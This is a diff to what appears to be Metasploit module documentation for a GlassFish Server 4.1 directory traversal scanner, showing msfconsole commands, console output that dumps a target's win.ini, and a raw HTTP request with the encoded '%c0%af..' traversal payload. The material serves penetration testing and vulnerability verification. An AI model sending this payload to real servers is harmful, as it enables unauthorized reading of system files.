@@ -6,14 +6,14 @@ Oracle GlassFish Server 4.1, which is listening by default on port 4848/TCP.
 Related links :
 
 * https://www.exploit-db.com/exploits/39441/
+* https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
 
 ## Verification
 
 ```
 Start msfconsole
 use auxiliary/scanner/http/glassfish_traversal
-set RHOST
-set RHOSTS
+set RHOSTS [IP]
 run
 ```
 
@@ -21,13 +21,13 @@ run
 
 ```
 msf > use auxiliary/scanner/http/glassfish_traversal 
-msf auxiliary(scanner/http/glassfish_traversal) > set RHOST 192.168.1.103
-RHOST => 192.168.1.103
-msf auxiliary(scanner/http/glassfish_traversal) > set RHOSTS 192.168.1.103
-RHOSTS => 192.168.1.103
+msf auxiliary(scanner/http/glassfish_traversal) > set RHOSTS 192.168.1.105
+RHOSTS => 192.168.1.105
+msf auxiliary(scanner/http/glassfish_traversal) > set verbose true
+verbose => true
 msf auxiliary(scanner/http/glassfish_traversal) > run
 
-[+] ; for 16-bit app support
+[+] 192.168.1.105:4848 - ; for 16-bit app support
 [fonts]
 [extensions]
 [mci extensions]
@@ -55,7 +55,7 @@ mts=MPEGVideo
 ts=MPEGVideo
 tts=MPEGVideo
 
-[+] File saved at: /home/inputzero/.msf4/loot/20180731174317_default_192.168.1.103_oracle.glassfish_982307.txt
+[+] File saved in: /home/input0/.msf4/loot/20180804132151_default_192.168.1.105_oracle.traversal_244542.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(scanner/http/glassfish_traversal) >
@@ -64,14 +64,16 @@ msf auxiliary(scanner/http/glassfish_traversal) >
 ## HTTP Request
 
 ```
-GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1
-Host: 192.168.1.105:8667
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0
+GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini HTTP/1.1
+Host: 192.168.1.105:4848
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
+Accept-Language: en-GB,en;q=0.5
 Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=3c54ae091ab200dc3ce8ecfff7c1
 Connection: close
 Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sat, 04 Aug 2018 05:53:42 GMT
 ```
 
 ## HTTP Response
